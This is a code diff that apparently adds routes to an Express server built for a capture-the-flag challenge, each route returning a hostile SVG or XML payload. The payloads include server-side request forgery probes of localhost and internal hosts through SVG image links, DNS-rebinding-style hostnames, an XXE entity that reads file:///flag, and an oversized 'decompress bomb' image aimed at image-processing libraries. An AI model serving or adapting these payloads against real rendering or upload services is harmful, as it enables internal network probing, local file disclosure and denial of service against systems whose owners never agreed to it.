@@ -18,6 +18,66 @@ app.get('/test', (req, res) => {
 
 // 1. XXE Injection in SVG
 // Internal endpoint discovery
+// Timing-based SSRF detection
+app.get('/timing-attack', (req, res) => {
+  console.log('Timing attack requested - checking for internal services');
+  
+  const targets = [
+    'http://localhost:8080',
+    'http://127.0.0.1:8080', 
+    'http://localhost:5000',
+    'http://127.0.0.1:5000',
+    'http://localhost:3000',
+    'http://127.0.0.1:3000',
+    'http://localhost:80',
+    'http://127.0.0.1:80',
+    'http://internal:8080',
+    'http://backend:5000'
+  ];
+
+  const target = targets[Math.floor(Math.random() * targets.length)];
+  console.log('Testing internal service at:', target);
+  
+  // This will hang if the internal service exists
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="${target}" width="100" height="100"/>
+</svg>`);
+});
+
+// 2. Try DNS rebinding attack
+app.get('/dns-rebind', (req, res) => {
+  console.log('DNS rebinding attack');
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://localhost:8080.127.0.0.1.xip.io/flag" width="100" height="100"/>
+  <image href="http://127.0.0.1.localhost.xip.io/flag" width="100" height="100"/>
+</svg>`);
+});
+
+// 3. Try different content types that might be processed differently
+app.get('/as-xml', (req, res) => {
+  console.log('Serving as pure XML');
+  res.setHeader('Content-Type', 'application/xml');
+  res.send(`<?xml version="1.0"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///flag">
+]>
+<data>&xxe;</data>`);
+});
+
+// 4. Try to exploit any image processing library vulnerabilities
+app.get('/decompress-bomb', (req, res) => {
+  console.log('Decompress bomb image');
+  // This might trigger vulnerabilities in image processing libraries
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(`<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100000" height="100000">
+  <image href="http://localhost:8080/flag" width="100000" height="100000"/>
+</svg>`);
+});
 app.get('/malformed-svg', (req, res) => {
   console.log('Malformed SVG requested');
   // This SVG is intentionally malformed to cause processing errors
